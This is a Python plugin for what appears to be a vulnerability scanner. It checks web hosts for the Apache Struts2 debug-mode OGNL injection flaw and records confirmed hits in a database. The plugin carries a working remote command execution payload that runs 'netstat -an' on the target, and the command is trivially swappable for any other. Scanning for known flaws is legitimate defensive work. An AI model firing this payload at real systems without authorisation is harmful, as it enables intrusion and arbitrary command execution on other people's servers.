
import requests
from celery_app.utils.utils import insert_vuln_db
from celery_app.config.config import web_port_short

#
plugin_id=41
default_port_list=web_port_short

def check(host, port=80):
    scheme = 'https' if '443' in str(port) else 'http'
    target = '{}://{}:{}'.format(scheme, host, port)
    uris = ['/?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=netstat%20-an']
    hits = ['Active Connections', 'Active Internet connections', 'ESTABLISHED', 'CLOSE_WAIT', 'TIME_WAIT']
    try:
        targets = ['{}{}'.format(target, uri) for uri in uris]
        requests.packages.urllib3.disable_warnings()
        with requests.Session() as session:
            for target in targets:
                response = session.get(target, timeout=10, verify=False)
                for hit in hits:
                    if hit in response.text:
                        output = response.text

                        insert_vuln_db(host, target, output, plugin_id)
                        return True, host, target, output
    except Exception as error:
        return False
    return False


